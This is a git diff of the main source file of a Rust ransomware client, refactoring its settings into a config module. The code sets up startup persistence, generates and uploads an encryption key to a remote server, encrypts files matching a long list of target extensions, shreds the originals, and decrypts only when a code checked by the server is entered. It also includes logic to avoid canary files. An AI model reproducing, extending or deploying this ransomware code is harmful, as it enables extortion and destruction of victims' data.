@@ -2,20 +2,21 @@
     all(target_os = "windows", not(debug_assertions)),
     windows_subsystem = "windows"
 )]
+#![allow(clippy::similar_names)]
 
-use coconut_crab_lib::file::get_exe_path_dir;
 use hex::encode;
 use log::{debug, error, info, warn};
 use std::{
     env,
-    path::PathBuf,
     sync::{
-        atomic::{AtomicU64, Ordering},
         Arc,
+        atomic::{AtomicU64, Ordering},
     },
     thread,
 };
 use zeroize::Zeroize;
+
+use coconut_crab_lib::file::get_exe_path_dir;
 
 mod persist;
 use persist::{start_persist, stop_persist};
@@ -24,7 +25,7 @@ mod crypto;
 use crypto::{decrypt, encrypt, encrypt_string, encrypt_sym_key, generate_sym_key, record};
 
 mod walker;
-use walker::{random_walk, walk};
+use walker::{random_walk, walk, walk_with_exts};
 
 mod comm;
 use comm::{
@@ -57,9 +58,7 @@ use_litcrypt!();
 
 slint::include_modules!();
 
-macro_rules! vec_of_strings {
-    ($($x:expr),*) => (vec![$($x.to_string()),*]);
-}
+mod config;
 
 fn main() {
     if cfg!(debug_assertions) {
@@ -72,85 +71,10 @@ fn main() {
             .init();
     }
 
-    /*
+    let server_fqdn = config::SERVER_FQDN.as_str();
+    let preshared_secret = config::PRESHARED_SECRET.as_str();
 
-        +---------------------+
-        | CONFIGURATION START |
-        +---------------------+
-
-    */
-
-    // Configure the remote server port [required]
-    let server_port = 3000;
-    // Configure the remote server IP address or hostname [required]
-    let server_fqdn = lc!("127.0.0.1");
-    // Configure the filesystem paths to target [required]
-    let allowlist_paths: Vec<PathBuf> = vec_of_strings!(
-        "C:\\Users\\jenki\\Downloads\\Dir1",
-        "C:\\Users\\jenki\\Downloads\\Dir2"
-    )
-    .iter()
-    .map(PathBuf::from)
-    .collect();
-    // let allowlist_paths = vec_of_strings!("Contacts", "Desktop", "Documents", "Downloads", "Favorites", "Music", "OneDrive\\Attachments", "OneDrive\\Desktop", "OneDrive\\Documents", "OneDrive\\Pictures", "OneDrive\\Music", "Pictures", "Videos");
-    // Configure the filesystem paths to avoid [optional]
-    let blocklist_paths: Option<Vec<PathBuf>> = None;
-    // Configure the file extensions to target [optional]
-    let allowlist_extensions: Option<Vec<String>> = Some(vec_of_strings!(
-        "jar", "xps", "pub", "eml", "htm", "aif", "ai", "dwg", "sqlite", "db", "accdb", "mdb",
-        "stl", "obj", "fbx", "3ds", "ply", "mpg", "mpeg", "webm", "mkv", "vsdm", "vsd", "vsdx",
-        "mp4", "mp3", "vmdk", "ova", "ovf", "vmx", "qcow", "iso", "gif", "aac", "pl", "7z", "rar",
-        "m4a", "wma", "avi", "wmv", "d3dbsp", "sc2save", "sie", "sum", "bkp", "flv", "js", "raw",
-        "jpeg", "tar", "zip", "gz", "cmd", "key", "dot", "docm", "txt", "doc", "docx", "xls",
-        "xlsx", "ppt", "pptx", "odt", "jpg", "png", "csv", "sql", "mdb", "sln", "php", "asp",
-        "aspx", "html", "xml", "psd", "bmp", "pdf", "py", "rtf", "heic", "webp", "mov"
-    ));
-    // Configure the file extensions to avoid [optional]
-    let blocklist_extensions: Option<Vec<String>> = None;
-    // Configure the extension used for encrypted files [required]
-    let encrypted_extension = String::from("chacha20");
-    // Configure whether the RSA public key should be saved to the disk [required]
-    let save_public_key_to_disk = true;
-    // Configure whether to set the wallpaper to the application icon [required]
-    let set_wallpaper = false;
-    // Configure whether the client should use HTTP or HTTPS [required]
-    let https = true;
-    // Configure whether the client should verify the web certificate of the server [required]
-    let verify_server = false;
-    // Confiure whether files should be encrypted or only logged for analysis [required]
-    let analyze_mode = false;
-    // Configure whether the client should add a startup entry [required]
-    let persist = true;
-    // Configure whether the client should avoid hidden files and directories [required]
-    let avoid_hidden = false;
-    // Configure whether the client should avoid files containing URLs (including native office ones) [required]
-    let avoid_urls = true;
-    // Configure whether the client should avoid files containing canary keywords [required]
-    let avoid_keywords = true;
-    // Configure whether the client should avoid broken image files [required]
-    let avoid_broken_images = false;
-    // Configure whether the client should analyze office and zip files for avoidance [required]
-    let analyze_office_zip = false;
-    // Configure whether the client should analyze pdf files for avoidance [required]
-    let analyze_pdf = false;
-    // Configure whether the client should encrypt files in a random order [required]
-    let random_order = false;
-    // Configure wait time between encrypting files in seconds [required]
-    let wait_time = 0;
-    // Configure jitter time applied to wait time between encrypting files in seconds [required]
-    let jitter_time = 0;
-    // Configure secret used to validate web requests [required]
-    let preshared_secret = lc!("gEFPsWMHEjdbBccgFKAFwdYwD98mH6cn7mmVwVgS8Vq4EUNocCwh3wLHrEVA7RzS");
-
-    /*
-
-        +-------------------+
-        | CONFIGURATION END |
-        +-------------------+
-
-    */
-
-    if persist {
+    if config::PERSIST {
         debug!("Establishing persistence");
         start_persist();
     }
@@ -158,11 +82,11 @@ fn main() {
     let exe_path_dir = get_exe_path_dir();
     let mut status = initialize_client(
         &exe_path_dir,
-        &server_fqdn,
-        &server_port,
-        &preshared_secret,
-        &https,
-        &verify_server,
+        server_fqdn,
+        config::SERVER_PORT,
+        preshared_secret,
+        config::HTTPS,
+        config::VERIFY_SERVER,
     );
     let num_threads = get_thread_nums();
 
@@ -177,31 +101,34 @@ fn main() {
             debug!("Encryption previously started");
 
             debug!("Starting key retrieval");
-            sym_key = match get_sym_key(
-                &server_fqdn,
-                &server_port,
+            sym_key = if let Some(key) = get_sym_key(
+                server_fqdn,
+                config::SERVER_PORT,
                 &status,
-                &String::from("0000-0000-0000-0000"),
-                &preshared_secret,
-                &https,
-                &verify_server,
+                &lc!("0000-0000-0000-0000"),
+                preshared_secret,
+                config::HTTPS,
+                config::VERIFY_SERVER,
             ) {
-                Some(sym_key_result) => sym_key_result,
-                None => {
-                    debug!("Unable to retrieve key. Marking encryption complete.");
-                    status.encryption_complete = true;
-                    [0u8; 32]
-                }
+                key
+            } else {
+                debug!("Unable to retrieve key. Marking encryption complete.");
+                status.encryption_complete = true;
+                [0u8; 32]
             };
         } else {
             debug!("Encryption not previously started");
             generate_sym_key(&mut sym_key);
 
-            let asym_pub_key =
-                download_asym_pub_key(&server_fqdn, &server_port, &https, &verify_server);
-            debug!("Got asymmetric public key: {:?}", asym_pub_key);
+            let asym_pub_key = download_asym_pub_key(
+                server_fqdn,
+                config::SERVER_PORT,
+                config::HTTPS,
+                config::VERIFY_SERVER,
+            );
+            debug!("Got asymmetric public key: {asym_pub_key:?}");
 
-            if save_public_key_to_disk {
+            if config::SAVE_PUBLIC_KEY_TO_DISK {
                 debug!("Saving asymmetric public key to disk");
                 write_asym_pub_key_to_disk(&asym_pub_key, &exe_path_dir.join("asym-pub-key.pem"));
             }
@@ -214,21 +141,21 @@ fn main() {
             );
 
             upload_sym_key(
-                &server_fqdn,
-                &server_port,
+                server_fqdn,
+                config::SERVER_PORT,
                 &status,
-                &preshared_secret,
-                &https,
-                &verify_server,
+                preshared_secret,
+                config::HTTPS,
+                config::VERIFY_SERVER,
             );
             debug!("Uploaded encrypted symmetric key");
 
             let nonce = counter.fetch_add(1, Ordering::Relaxed);
-            debug!("Nonce value after increment: {}", nonce);
+            debug!("Nonce value after increment: {nonce}");
 
             let mut full_nonce_bytes: [u8; 12] = [0u8; 12];
             full_nonce_bytes[0..8].copy_from_slice(&nonce.to_le_bytes());
-            debug!("Nonce value after padding: {:?}", full_nonce_bytes);
+            debug!("Nonce value after padding: {full_nonce_bytes:?}");
 
             status.symmetrically_encrypted_id_nonce = encode(full_nonce_bytes);
             status.symmetrically_encrypted_id =
@@ -245,19 +172,10 @@ fn main() {
 
     let sym_key_arc = Arc::new(sym_key);
     let counter_arc = Arc::new(counter);
-    let blocklist_paths_arc = Arc::new(blocklist_paths);
-    let allowlist_extensions_arc = Arc::new(allowlist_extensions);
-    let blocklist_extensions_arc = Arc::new(blocklist_extensions);
-    let encrypted_extension_vec_arc = Arc::new(Some(vec![encrypted_extension.clone()]));
-    let encrypted_extension_arc = Arc::new(encrypted_extension);
-    let avoid_hidden_arc = Arc::new(avoid_hidden);
-    let avoid_urls_arc = Arc::new(avoid_urls);
-    let avoid_keywords_arc = Arc::new(avoid_keywords);
-    let avoid_broken_images_arc = Arc::new(avoid_broken_images);
-    let analyze_office_zip_arc = Arc::new(analyze_office_zip);
-    let analyze_pdf_arc = Arc::new(analyze_pdf);
-    let wait_time_arc = Arc::new(wait_time);
-    let jitter_time_arc = Arc::new(jitter_time);
+    let encrypted_extension = config::ENCRYPTED_EXTENSION.to_string();
+    let encrypted_extension_arc = Arc::new(encrypted_extension.clone());
+    let wait_time_arc = Arc::new(config::WAIT_TIME);
+    let jitter_time_arc = Arc::new(config::JITTER_TIME);
     let exe_path_dir_arc = Arc::new(exe_path_dir);
 
     if !status.encryption_complete {
@@ -272,35 +190,15 @@ fn main() {
             crossbeam_channel::bounded(cap(num_threads.encrypt_threads));
         let mut thread_handles = Vec::new();
 
-        for path_workload in allowlist_paths
-            .chunks(allowlist_paths.len() / num_threads.walk_threads + 1)
-            .map(|chunk| chunk.to_vec())
-        {
-            debug!(
-                "Spawning walk thread for path workload: {:?}",
-                path_workload
-            );
-            let path_workload_arc = Arc::new(path_workload);
-            if random_order {
-                thread_handles.push(random_walk(
-                    channel_a_sender.clone(),
-                    path_workload_arc.clone(),
-                    blocklist_paths_arc.clone(),
-                    allowlist_extensions_arc.clone(),
-                    blocklist_extensions_arc.clone(),
-                    avoid_hidden_arc.clone(),
-                ));
-                debug!("Spawned walk thread sending paths for encryption in random order");
-            } else {
-                thread_handles.push(walk(
-                    channel_a_sender.clone(),
-                    path_workload_arc.clone(),
-                    blocklist_paths_arc.clone(),
-                    allowlist_extensions_arc.clone(),
-                    blocklist_extensions_arc.clone(),
-                    avoid_hidden_arc.clone(),
-                ));
-                debug!("Spawned walk thread sending paths for encryption in sequential order");
+        if config::RANDOM_ORDER {
+            for _ in 0..num_threads.walk_threads {
+                thread_handles.push(random_walk(channel_a_sender.clone()));
+                debug!("Spawned random walk thread");
+            }
+        } else {
+            for _ in 0..num_threads.walk_threads {
+                thread_handles.push(walk(channel_a_sender.clone()));
+                debug!("Spawned walk thread");
             }
         }
         drop(channel_a_sender);
@@ -312,7 +210,7 @@ fn main() {
         let (channel_c_sender, channel_c_receiver) =
             crossbeam_channel::bounded(cap(num_threads.shred_threads));
 
-        if analyze_pdf || analyze_office_zip || avoid_broken_images {
+        if config::ANALYZE_PDF || config::ANALYZE_OFFICE_ZIP || config::AVOID_BROKEN_IMAGES {
             debug!("Canary mode enabled");
 
             let (channel_b_sender, channel_b_receiver) =
@@ -322,13 +220,8 @@ fn main() {
                 thread_handles.push(filter_canary(
                     channel_a_receiver.clone(),
                     channel_b_sender.clone(),
-                    avoid_keywords_arc.clone(),
-                    avoid_urls_arc.clone(),
-                    avoid_broken_images_arc.clone(),
-                    analyze_office_zip_arc.clone(),
-                    analyze_pdf_arc.clone(),
                 ));
-                debug!("Spawned canary filter thread {}", thread_num);
+                debug!("Spawned canary filter thread {thread_num}");
             }
             drop(channel_a_receiver);
             drop(channel_b_sender);
@@ -337,7 +230,7 @@ fn main() {
                 thread_handles.len()
             );
 
-            if analyze_mode {
+            if config::ANALYZE_MODE {
                 debug!("Analyze mode enabled");
                 thread_handles.push(record(channel_b_receiver.clone(), exe_path_dir_arc.clone()));
                 debug!("Spawned analysis thread");
@@ -359,7 +252,7 @@ fn main() {
                         wait_time_arc.clone(),
                         jitter_time_arc.clone(),
                     ));
-                    debug!("Spawned encryption thread {}", thread_num);
+                    debug!("Spawned encryption thread {thread_num}");
                 }
                 debug!(
                     "All encryption threads spawned. {} total threads spawned.",
@@ -370,7 +263,7 @@ fn main() {
 
                 for thread_num in 0..num_threads.shred_threads {
                     thread_handles.push(shred(channel_c_receiver.clone()));
-                    debug!("Spawned shred thread {}", thread_num);
+                    debug!("Spawned shred thread {thread_num}");
                 }
                 drop(channel_c_receiver);
                 debug!(
@@ -378,7 +271,7 @@ fn main() {
                     thread_handles.len()
                 );
             }
-        } else if analyze_mode {
+        } else if config::ANALYZE_MODE {
             debug!("Analyze mode enabled");
             thread_handles.push(record(channel_a_receiver.clone(), exe_path_dir_arc.clone()));
             debug!("Spawned analysis thread");
@@ -400,7 +293,7 @@ fn main() {
                     wait_time_arc.clone(),
                     jitter_time_arc.clone(),
                 ));
-                debug!("Spawned encryption thread {}", thread_num);
+                debug!("Spawned encryption thread {thread_num}");
             }
             debug!(
                 "All encryption threads spawned. {} total threads spawned.",
@@ -411,7 +304,7 @@ fn main() {
 
             for thread_num in 0..num_threads.shred_threads {
                 thread_handles.push(shred(channel_c_receiver.clone()));
-                debug!("Spawned shred thread {}", thread_num);
+                debug!("Spawned shred thread {thread_num}");
             }
             drop(channel_c_receiver);
             debug!(
@@ -421,7 +314,7 @@ fn main() {
         }
 
         for handle in thread_handles {
-            debug!("Joining thread: {:?}", handle);
+            debug!("Joining thread: {handle:?}");
             handle.join().expect("Thread panicked");
         }
 
@@ -431,12 +324,12 @@ fn main() {
         debug!("Updated status CSV");
 
         announce_completion(
-            &server_fqdn,
-            &server_port,
+            server_fqdn,
+            config::SERVER_PORT,
             &status,
-            &preshared_secret,
-            &https,
-            &verify_server,
+            preshared_secret,
+            config::HTTPS,
+            config::VERIFY_SERVER,
         );
         debug!("Announced completion");
     }
@@ -449,23 +342,13 @@ fn main() {
             crossbeam_channel::bounded(std::cmp::max(num_threads.decrypt_threads * 2, 64));
         let mut thread_handles = Vec::new();
 
-        for path_workload in allowlist_paths
-            .chunks(allowlist_paths.len() / num_threads.walk_threads + 1)
-            .map(|chunk| chunk.to_vec())
-        {
-            debug!(
-                "Spawning walk thread for path workload: {:?}",
-                path_workload
-            );
-            thread_handles.push(walk(
+        for _ in 0..num_threads.walk_threads {
+            debug!("Spawning walk thread for decryption");
+            thread_handles.push(walk_with_exts(
                 s3.clone(),
-                Arc::new(path_workload).clone(),
-                blocklist_paths_arc.clone(),
-                encrypted_extension_vec_arc.clone(),
-                blocklist_extensions_arc.clone(),
-                avoid_hidden_arc.clone(),
+                Some(vec![encrypted_extension.clone()]),
+                None,
             ));
-            debug!("Spawned walk thread sending paths for decryption in sequential order");
         }
         drop(s3);
         debug!(
@@ -476,7 +359,7 @@ fn main() {
         let sym_key_arc = Arc::new(sym_key);
         for thread_num in 0..num_threads.decrypt_threads {
             thread_handles.push(decrypt(r3.clone(), sym_key_arc.clone()));
-            debug!("Spawned decryption thread {}", thread_num);
+            debug!("Spawned decryption thread {thread_num}");
         }
         drop(r3);
         debug!(
@@ -485,12 +368,12 @@ fn main() {
         );
 
         for handle in thread_handles {
-            debug!("Joining thread: {:?}", handle);
+            debug!("Joining thread: {handle:?}");
             handle.join().expect("Thread panicked");
         }
     };
 
-    if set_wallpaper {
+    if config::SET_WALLPAPER {
         set_icon_wallpaper();
     }
 
@@ -504,50 +387,47 @@ fn main() {
         debug!("Initializing decryption handler thread");
         loop {
             let code: Arc<String> = match r_decrypt.recv() {
-                Ok(sym_key_result) => {
-                    debug!("Received code over channel: {:?}", sym_key_result);
-                    sym_key_result
+                Ok(key) => {
+                    debug!("Received code over channel: {key:?}");
+                    key
                 }
-                Err(file_path_result) => {
-                    warn!("Error receiving code over channel: {}", file_path_result);
+                Err(error) => {
+                    warn!("Error receiving code over channel: {error}");
                     return;
                 }
             };
 
             debug!("Requesting symmetric key using user provided code");
-            let sym_key = match get_sym_key(
-                &server_fqdn,
-                &server_port,
+            let Some(sym_key) = get_sym_key(
+                server_fqdn,
+                config::SERVER_PORT,
                 &status,
                 &code,
-                &preshared_secret,
-                &https,
-                &verify_server,
-            ) {
-                Some(sym_key_result) => sym_key_result,
-                None => {
-                    if ui_handle
-                        .upgrade_in_event_loop(move |handle| {
-                            handle.set_status_text("Code failed verification".into())
-                        })
-                        .is_err()
-                    {
-                        error!("Failed to upgrade UI handle");
-                    }
-                    if ui_handle
-                        .upgrade_in_event_loop(move |handle| handle.set_status_progress(false))
-                        .is_err()
-                    {
-                        error!("Failed to upgrade UI handle");
-                    }
-                    return;
+                preshared_secret,
+                config::HTTPS,
+                config::VERIFY_SERVER,
+            ) else {
+                if ui_handle
+                    .upgrade_in_event_loop(move |handle| {
+                        handle.set_status_text("Code failed verification".into());
+                    })
+                    .is_err()
+                {
+                    error!("Failed to upgrade UI handle");
                 }
+                if ui_handle
+                    .upgrade_in_event_loop(move |handle| handle.set_status_progress(false))
+                    .is_err()
+                {
+                    error!("Failed to upgrade UI handle");
+                }
+                return;
             };
 
             info!("Starting decryption");
             if ui_handle
                 .upgrade_in_event_loop(move |handle| {
-                    handle.set_status_text("Code successfully verified. Decrypting...".into())
+                    handle.set_status_text("Code successfully verified. Decrypting...".into());
                 })
                 .is_err()
             {
@@ -559,7 +439,7 @@ fn main() {
             info!("Decryption complete");
             if ui_handle
                 .upgrade_in_event_loop(move |handle| {
-                    handle.set_status_text("Decryption complete".into())
+                    handle.set_status_text("Decryption complete".into());
                 })
                 .is_err()
             {
@@ -572,7 +452,7 @@ fn main() {
                 error!("Failed to upgrade UI handle");
             }
 
-            if persist {
+            if config::PERSIST {
                 debug!("Ending persistence");
                 stop_persist();
             }
@@ -584,7 +464,7 @@ fn main() {
         let ui = ui_handle.unwrap();
 
         let code = ui.get_code().to_string();
-        info!("Verifying code: {}", code);
+        info!("Verifying code: {code}");
 
         ui.set_status_text("Verifying code...".into());
         ui.set_status_progress(true);
